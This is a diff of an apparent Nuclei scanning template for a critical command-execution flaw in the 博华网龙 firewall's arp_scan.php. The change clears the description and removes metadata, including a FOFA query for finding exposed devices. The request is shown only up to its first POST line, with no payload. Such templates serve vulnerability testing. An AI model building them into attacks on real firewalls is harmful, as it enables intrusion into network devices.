@@ -3,12 +3,8 @@ info:
   name: 博华网龙防火墙系统 arp_scan命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fh40n82wpbfua7ol'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fh40n82wpbfua7ol
-    fofa: title="博华网龙"
 http:
 - raw:
   - 'POST /firewall/arp_scan.php HTTP/1.1
